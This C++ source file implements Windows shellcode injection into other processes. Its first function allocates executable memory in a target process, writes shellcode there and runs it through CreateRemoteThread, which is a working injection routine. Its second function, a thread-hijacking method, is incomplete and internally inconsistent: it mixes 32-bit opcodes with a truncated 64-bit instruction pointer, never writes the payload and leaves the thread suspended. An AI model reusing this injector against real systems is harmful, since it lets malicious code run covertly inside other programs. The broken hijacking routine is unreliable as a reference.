#include "inject.h"

void injector_t::inject_shellcode_crt(const PROCESS_INFO& process_info, const std::vector<BYTE>& shellcode)
{
   
    // Allocate memory for the shellcode
    LPVOID allocated = VirtualAllocEx(process_info.handle.get(), NULL, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (allocated == NULL)
    {
        print_error(GetLastError());
        return;
    }

    // Injecting the shellcode into the process
    SIZE_T bytes_written;
    if (!WriteProcessMemory(process_info.handle.get(), allocated, &shellcode[0], shellcode.size(), &bytes_written))
    {
        print_error(GetLastError());
        return;
    }

    // Execute the shellcode
    HANDLE thread = CreateRemoteThread(process_info.handle.get(), NULL, NULL, (LPTHREAD_START_ROUTINE)allocated, NULL, NULL, NULL);
    if (thread == NULL)
    {
        print_error(GetLastError());
        return;
    }
    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);

    // Free the allocated memory
    if (!VirtualFreeEx(process_info.handle.get(), allocated, 0, MEM_RELEASE))
    {
        print_error(GetLastError());
        return;
    }
}

void injector_t::inject_shellcode_mth(const PROCESS_INFO& process_info, std::vector<BYTE> shellcode)
{
    std::vector<BYTE> prologue  = { 0x60, 0x9c }; // pushal; pushfd
    std::vector<BYTE> epilogue  = { 0x9d, 0x61 }; // popfd; popal
    std::vector<BYTE> un_hijack = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xc3}; // push originaEIP; retn
    
    // prepare shellcode for this method
    shellcode.insert(shellcode.begin(), prologue.begin(),  prologue.end());
    shellcode.insert(shellcode.end(),   epilogue.begin(),  epilogue.end());
    shellcode.insert(shellcode.end(),   un_hijack.begin(), un_hijack.end());

    // obtain the context of the thread
    HANDLE main_thread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, process_info.tid);
    if (main_thread != NULL)
    {
        DWORD suspend_count = SuspendThread(main_thread);
        if (suspend_count != (DWORD) -1)
        {
            CONTEXT context;
            context.ContextFlags = CONTEXT_ALL;
            if (GetThreadContext(main_thread, &context))
            {
                // Restore the previous entry point
                shellcode[shellcode.size() - 1 - 4] = (BYTE)context.Rip;
                shellcode[shellcode.size() - 1 - 3] = (BYTE)(context.Rip >> 8);
                shellcode[shellcode.size() - 1 - 2] = (BYTE)(context.Rip >> 16);
                shellcode[shellcode.size() - 1 - 1] = (BYTE)(context.Rip >> 24);
            }
            else
                print_error(GetLastError());
        }
        else
            print_error(GetLastError());
    }
    else
        print_error(GetLastError());
}